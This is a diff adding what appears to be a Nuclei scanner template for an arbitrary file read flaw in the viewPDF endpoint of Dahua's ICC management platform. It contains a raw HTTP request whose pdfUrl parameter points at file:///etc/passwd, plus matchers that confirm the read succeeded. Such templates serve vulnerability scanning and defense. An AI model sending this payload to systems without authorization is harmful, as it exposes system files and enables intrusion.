@@ -1,0 +1,21 @@
+id: dahua-icc-viewPDF-readfile
+info:
+  name: 大华ICC智能物联综合管理平台viewPDF任意文件读取
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1052.75 Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - root
+          - /bin/bash
+    matchers-condition: and
